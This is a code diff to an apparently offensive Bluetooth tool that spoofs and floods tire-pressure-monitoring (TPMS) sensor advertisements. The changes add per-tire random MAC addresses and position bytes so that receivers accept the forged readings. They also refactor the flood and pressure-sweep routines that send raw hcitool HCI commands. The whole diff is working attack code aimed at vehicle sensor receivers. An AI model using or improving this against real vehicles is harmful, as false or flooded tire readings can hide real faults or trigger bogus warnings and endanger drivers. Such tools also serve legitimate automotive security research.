@@ -882,6 +882,9 @@ class TPMSSpoofer:
                 payload += struct.pack("<H", checksum)
 
                 pos_name = TIRE_POSITIONS.get(position, "Unknown")
+                # Include position in sensor name for differentiation
+                pos_suffix = {0x01: "FL", 0x02: "FR", 0x03: "RL", 0x04: "RR"}.get(position, "")
+                adv_name = f"{sensor_name}_{pos_suffix}" if pos_suffix else sensor_name
                 info(f"Impersonating TPMS sensor: {pos_name}")
                 info(f"Spoofed data: {pressure_psi:.1f} PSI, {temperature_c:.1f}C, "
                      f"bat={battery_pct}%")
@@ -891,7 +894,7 @@ class TPMSSpoofer:
 
             with step(f"Broadcasting {count} sensor advertisements"):
                 sent = self._broadcast_advertisements(
-                    payload, sensor_name, count, interval_ms
+                    payload, adv_name, count, interval_ms, position
                 )
                 success(f"Sent {sent}/{count} spoofed TPMS advertisements")
 
@@ -921,12 +924,39 @@ class TPMSSpoofer:
             count=count,
         )
 
+    def _generate_sensor_address(self, position: int) -> list[str]:
+        """Generate a deterministic random BLE address for a tire position.
+
+        Real TPMS receivers identify sensors by BLE MAC address. Each tire
+        position needs a unique address for the receiver to map readings
+        to the correct wheel. Uses position as seed for reproducibility.
+        """
+        import hashlib
+        seed = f"bttap_tpms_{position}".encode()
+        h = hashlib.sha256(seed).digest()
+        # BLE random static address: two MSBs of first byte must be 0b11
+        addr_bytes = [h[0] | 0xC0] + list(h[1:6])
+        return [f"0x{b:02x}" for b in addr_bytes]
+
     def _broadcast_advertisements(
         self, tpms_payload: bytes, name: str, count: int, interval_ms: int,
+        position: int = 0x01,
     ) -> int:
-        """Send BLE advertisements using HCI commands."""
-        adv_data = self._build_adv_packet(tpms_payload, name)
+        """Send BLE advertisements using HCI commands.
+
+        Sets a per-position random advertising address so receivers that
+        identify sensors by MAC can map readings to the correct tire.
+        """
+        adv_data = self._build_adv_packet(tpms_payload, name, position)
         verbose(f"Advertisement data ({len(adv_data)} bytes): {adv_data.hex()}")
+
+        # HCI LE Set Random Address — unique per tire position
+        addr_bytes = self._generate_sensor_address(position)
+        set_addr_cmd = [
+            "hcitool", "-i", self.hci, "cmd",
+            "0x08", "0x0005",
+        ] + addr_bytes
+        verbose(f"Sensor address for position 0x{position:02x}: {':'.join(addr_bytes)}")
 
         # HCI LE Set Advertising Data
         set_adv_cmd = [
@@ -935,7 +965,7 @@ class TPMSSpoofer:
             str(len(adv_data)),
         ] + [f"0x{b:02x}" for b in adv_data]
 
-        # HCI LE Set Advertising Parameters (non-connectable undirected)
+        # HCI LE Set Advertising Parameters (non-connectable undirected, random addr)
         interval = max(0x0020, interval_ms * 16 // 10)  # 0.625ms units
         set_params_cmd = [
             "hcitool", "-i", self.hci, "cmd",
@@ -943,7 +973,8 @@ class TPMSSpoofer:
             f"0x{interval & 0xFF:02x}", f"0x{(interval >> 8) & 0xFF:02x}",
             f"0x{interval & 0xFF:02x}", f"0x{(interval >> 8) & 0xFF:02x}",
             "0x03",  # ADV_NONCONN_IND (non-connectable, like real TPMS sensors)
-            "0x00", "0x00",
+            "0x01",  # Own address type: random
+            "0x00",
             "0x00", "0x00", "0x00", "0x00", "0x00", "0x00",
             "0x07", "0x00",
         ]
@@ -957,11 +988,16 @@ class TPMSSpoofer:
 
         sent = 0
         try:
+            # Set random address first (must be done before enabling advertising)
+            result = run_cmd(set_addr_cmd, timeout=5)
+            if result.returncode != 0:
+                warning(f"Failed to set random address (falling back to adapter address): {result.stderr}")
+
             result = run_cmd(set_params_cmd, timeout=5)
             if result.returncode != 0:
                 error(f"Failed to set advertising parameters: {result.stderr}")
                 return 0
-            verbose("Advertising parameters configured (ADV_NONCONN_IND)")
+            verbose("Advertising parameters configured (ADV_NONCONN_IND, random addr)")
 
             result = run_cmd(set_adv_cmd, timeout=5)
             if result.returncode != 0:
@@ -986,11 +1022,15 @@ class TPMSSpoofer:
 
         return sent
 
-    def _build_adv_packet(self, tpms_payload: bytes, name: str = "TPMS_Sensor") -> bytes:
+    def _build_adv_packet(self, tpms_payload: bytes, name: str = "TPMS_Sensor",
+                          position: int = 0x01) -> bytes:
         """Build BLE advertisement data with TPMS payload.
 
         Mimics real aftermarket TPMS sensor advertisements:
           [Flags AD][UUID 0x27a5 AD][Manufacturer Data AD][Short Name AD]
+
+        Position byte is embedded in manufacturer data so receivers that
+        parse the payload (not just MAC) can identify the tire.
         """
         # AD: Flags (General Discoverable, BR/EDR not supported)
         flags = bytes([0x02, 0x01, 0x06])
@@ -999,8 +1039,9 @@ class TPMSSpoofer:
         uuid_ad = bytes([0x03, 0x03, 0xa5, 0x27])
 
         # AD: Manufacturer Specific Data (type 0xFF)
+        # Format: [company_id LE16][position byte][tpms_payload 7 bytes]
         company_id = struct.pack("<H", 0x0001)  # Generic / aftermarket
-        mfg_data = company_id + tpms_payload
+        mfg_data = company_id + bytes([position]) + tpms_payload
         mfg_ad = bytes([len(mfg_data) + 1, 0xFF]) + mfg_data
 
         # AD: Shortened Local Name
@@ -1043,6 +1084,10 @@ class TPMSFlood:
             end_time = start_time + duration
 
             with step("Generating flood traffic"):
+                disable_cmd = ["hcitool", "-i", self.hci, "cmd",
+                               "0x08", "0x000a", "0x00"]
+                enable_cmd = ["hcitool", "-i", self.hci, "cmd",
+                              "0x08", "0x000a", "0x01"]
                 try:
                     while time.time() < end_time:
                         position = random.choice([0x01, 0x02, 0x03, 0x04])
@@ -1058,7 +1103,13 @@ class TPMSFlood:
                         payload += struct.pack("<H", int(pressure * 10))
                         payload += struct.pack("<H", sum(payload) & 0xFFFF)
 
-                        adv_data = self._spoofer._build_adv_packet(payload)
+                        pos_tag = {0x01: "FL", 0x02: "FR", 0x03: "RL", 0x04: "RR"}.get(position, "")
+                        adv_data = self._spoofer._build_adv_packet(payload, f"TPMS_{pos_tag}", position)
+
+                        # Set per-position random address for MAC-based identification
+                        addr_bytes = self._spoofer._generate_sensor_address(position)
+                        run_cmd(["hcitool", "-i", self.hci, "cmd",
+                                 "0x08", "0x0005"] + addr_bytes, timeout=3)
 
                         set_cmd = [
                             "hcitool", "-i", self.hci, "cmd",
@@ -1067,11 +1118,9 @@ class TPMSFlood:
                         ] + [f"0x{b:02x}" for b in adv_data]
 
                         run_cmd(set_cmd, timeout=3)
-                        run_cmd(["hcitool", "-i", self.hci, "cmd",
-                                 "0x08", "0x000a", "0x01"], timeout=3)
+                        run_cmd(enable_cmd, timeout=3)
                         time.sleep(interval_ms / 1000.0)
-                        run_cmd(["hcitool", "-i", self.hci, "cmd",
-                                 "0x08", "0x000a", "0x00"], timeout=3)
+                        run_cmd(disable_cmd, timeout=3)
                         sent += 1
 
                         if sent % 50 == 0:
@@ -1081,8 +1130,7 @@ class TPMSFlood:
                 except KeyboardInterrupt:
                     warning("Flood interrupted")
                 finally:
-                    run_cmd(["hcitool", "-i", self.hci, "cmd",
-                             "0x08", "0x000a", "0x00"], timeout=3)
+                    run_cmd(disable_cmd, timeout=3)
 
             elapsed = time.time() - start_time
             rate = sent / elapsed if elapsed > 0 else 0
@@ -1103,6 +1151,16 @@ class TPMSFlood:
             end_time = start_time + duration
 
             with step("Sweeping pressure values"):
+                disable_cmd = ["hcitool", "-i", self.hci, "cmd",
+                               "0x08", "0x000a", "0x00"]
+                enable_cmd = ["hcitool", "-i", self.hci, "cmd",
+                              "0x08", "0x000a", "0x01"]
+
+                # Set per-position random address and advertising params once
+                addr_bytes = self._spoofer._generate_sensor_address(position)
+                run_cmd(["hcitool", "-i", self.hci, "cmd",
+                         "0x08", "0x0005"] + addr_bytes, timeout=3)
+
                 try:
                     pressure = 0.0
                     while time.time() < end_time:
@@ -1111,7 +1169,8 @@ class TPMSFlood:
                         payload += struct.pack("<H", int(pressure * 10))
                         payload += struct.pack("<H", sum(payload) & 0xFFFF)
 
-                        adv_data = self._spoofer._build_adv_packet(payload)
+                        pos_tag = {0x01: "FL", 0x02: "FR", 0x03: "RL", 0x04: "RR"}.get(position, "")
+                        adv_data = self._spoofer._build_adv_packet(payload, f"TPMS_{pos_tag}", position)
                         set_cmd = [
                             "hcitool", "-i", self.hci, "cmd",
                             "0x08", "0x0008",
@@ -1119,11 +1178,9 @@ class TPMSFlood:
                         ] + [f"0x{b:02x}" for b in adv_data]
 
                         run_cmd(set_cmd, timeout=3)
-                        run_cmd(["hcitool", "-i", self.hci, "cmd",
-                                 "0x08", "0x000a", "0x01"], timeout=3)
+                        run_cmd(enable_cmd, timeout=3)
                         time.sleep(0.02)
-                        run_cmd(["hcitool", "-i", self.hci, "cmd",
-                                 "0x08", "0x000a", "0x00"], timeout=3)
+                        run_cmd(disable_cmd, timeout=3)
 
                         sent += 1
                         pressure += 0.5
@@ -1136,8 +1193,7 @@ class TPMSFlood:
                 except KeyboardInterrupt:
                     warning("Sweep interrupted")
                 finally:
-                    run_cmd(["hcitool", "-i", self.hci, "cmd",
-                             "0x08", "0x000a", "0x00"], timeout=3)
+                    run_cmd(disable_cmd, timeout=3)
 
             elapsed = time.time() - start_time
             success(f"Sweep complete: {sent} packets in {elapsed:.1f}s")
